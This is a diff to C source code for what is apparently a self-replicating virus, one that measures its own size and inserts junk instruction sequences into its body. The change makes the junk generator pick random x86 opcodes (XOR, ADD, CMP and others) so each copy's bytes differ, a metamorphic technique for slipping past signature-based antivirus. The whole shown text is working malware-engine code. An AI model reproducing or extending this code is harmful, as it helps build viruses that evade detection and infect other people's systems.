@@ -13,7 +13,6 @@ extern void end(void);
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
-
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 
 /*
@@ -62,15 +61,53 @@ static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 	}
 }
 
-/* find and print the offsets */
-//static void fprint_offsets(uint8_t *self, size_t size) {
-//	for (size_t i = 0; i < size - JUNK_LEN; i++) {
-//		if (find_pattern(self, i)) {
-//			_printf("0x%x,", i);
-//		}
-//	}
-//}
+typedef enum {
+	OPCODE_XCHG  = 0x87, // XCHG r/m, r
+	OPCODE_MOV   = 0x8B, // MOV r, r/m
+	OPCODE_MOVSX = 0x63, // MOVSX r, r/m
 
+	OPCODE_ADD_RM_R = 0x01, // ADD r/m, r
+	OPCODE_ADD_R_RM = 0x03, // ADD r, r/m
+
+	OPCODE_SUB_RM_R = 0x29, // SUB r/m, r
+	OPCODE_SUB_R_RM = 0x2B, // SUB r, r/m
+
+	OPCODE_ADC  = 0x11, // ADC r/m, r
+	OPCODE_SBB  = 0x19, // SBB r/m, r
+	OPCODE_ADD  = 0x83, // ADD r/m, r
+
+    OPCODE_AND  = 0x21, // AND r/m, r
+    OPCODE_OR   = 0x09, // OR r/m, r
+    OPCODE_XOR  = 0x31, // XOR r/m, r
+    OPCODE_TEST = 0x85, // TEST r/m, r
+    OPCODE_CMP  = 0x39,  // CMP r/m, r
+
+} Opcode;
+
+
+static uint8_t get_random_opcode(void) {
+	const uint8_t opcodes[] = {
+		OPCODE_XCHG,
+		OPCODE_MOV,
+		OPCODE_MOVSX,
+		OPCODE_ADD_RM_R,
+		OPCODE_ADD_R_RM,
+		OPCODE_SUB_RM_R,
+		OPCODE_SUB_R_RM,
+		OPCODE_ADC,
+		OPCODE_SBB,
+		OPCODE_AND,
+		OPCODE_OR,
+		OPCODE_XOR,
+		OPCODE_TEST,
+		OPCODE_CMP
+	};
+
+	uint8_t rand;
+	getrandom(&rand, 1, 0);
+	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
+
+}
 
 static void gen_junk(uint8_t *rdm_junk) {
 
@@ -92,18 +129,28 @@ static void gen_junk(uint8_t *rdm_junk) {
 	uint8_t pop_1 = POP_OP + reg_1;
 	uint8_t pop_2 = POP_OP + reg_2;
 
-	uint8_t nop[3] = {OP_64, XCHG, RAX_RAX};
-	nop[2] += reg_1;
-	nop[2] += (reg_2 << 3);
+	uint8_t nop_1[3] = {OP_64, XCHG, RAX_RAX};
+	uint8_t nop_2[3] = {OP_64, XCHG, RAX_RAX};
+
+	uint8_t opcode_1 = get_random_opcode();
+	uint8_t opcode_2 = get_random_opcode();
+
+	nop_1[1] = opcode_1;
+	nop_1[2] += reg_1;
+	nop_1[2] += (reg_2 << 3);
+
+	nop_2[1] = opcode_2;
+	nop_2[2] += reg_2;
+	nop_2[2] += (reg_1 << 3);
 
 	rdm_junk[0] = push_1;
 	rdm_junk[1] = push_2;
-	rdm_junk[2] = nop[0];
-	rdm_junk[3] = nop[1];
-	rdm_junk[4] = nop[2];
-	rdm_junk[5] = nop[0];
-	rdm_junk[6] = nop[1];
-	rdm_junk[7] = nop[2];
+	rdm_junk[2] = nop_1[0];
+	rdm_junk[3] = nop_1[1];
+	rdm_junk[4] = nop_1[2];
+	rdm_junk[5] = nop_2[0];
+	rdm_junk[6] = nop_2[1];
+	rdm_junk[7] = nop_2[2];
 	rdm_junk[8] = pop_2;
 	rdm_junk[9] = pop_1;
 
